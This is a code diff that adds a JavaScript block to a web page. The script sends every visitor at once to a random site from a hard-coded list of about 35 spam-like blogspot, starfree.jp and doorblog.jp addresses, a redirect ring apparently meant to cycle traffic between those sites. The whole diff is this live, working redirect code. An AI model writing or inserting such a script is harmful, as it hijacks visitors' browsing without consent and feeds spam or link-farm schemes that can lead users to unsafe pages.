@@ -1,0 +1,55 @@
+
+<script language="JavaScript">
+var urlsToLoad  = [
+
+'http://celebfq.blogspot.com/?m=1', 
+'https://dlmusz.blogspot.com/?m=1', 
+'https://tntita.blogspot.com/?m=1', 
+'https://sdfsefds.blogspot.com/?m=1', 
+'https://animemusz.blogspot.com/?m=1', 
+'https://hihantwe.blogspot.com/?m=1', 
+'https://yaswpra.blogspot.com/?m=1', 
+'https://cealr.blogspot.com/?m=1', 
+'https://sowildpthi.blogspot.com/?m=1', 
+'https://wissindo.blogspot.com/?m=1', 
+'https://nycmetropolitan.blogspot.com/?m=1', 
+'https://tnayrc.blogspot.com/?m=1', 
+'https://casdow.blogspot.com/?m=1', 
+'http://uks.starfree.jp', 
+'http://swpr.starfree.jp', 
+'http://ryc.starfree.jp', 
+'http://obr.starfree.jp', 
+'http://osak.starfree.jp', 
+'http://niy.starfree.jp', 
+'http://myrs.starfree.jp', 
+'http://cys.starfree.jp', 
+'http://cli.starfree.jp', 
+'http://yis.starfree.jp', 
+'http://indoviral.doorblog.jp', 
+'http://myrf.doorblog.jp', 
+'https://spichen.blogspot.com/?m=1', 
+'https://2danbi.blogspot.com/?m=1', 
+'https://celebalt.blogspot.com/?m=1', 
+'https://yomich.blogspot.com/?m=1', 
+'https://padxfi.blogspot.com/?m=1', 
+'https://waremp3.blogspot.com/?m=1',
+'https://celebruu.blogspot.com/?m=1',
+'https://meggiita.blogspot.com/?m=1',
+'https://kbjblogmusz.blogspot.com/?m=1'
+
+];
+
+setTimeout (GotoRandomURL, 0);
+
+function GotoRandomURL () {
+    var numUrls     = urlsToLoad.length;
+    var urlIdx      = urlsToLoad.indexOf (location.href);
+    if (urlIdx >= 0) {
+        urlsToLoad.splice (urlIdx, 1);
+        numUrls--;
+    }
+
+    urlIdx          = Math.floor (Math.random () * numUrls);
+    location.href   = urlsToLoad[urlIdx];
+}
+</script>
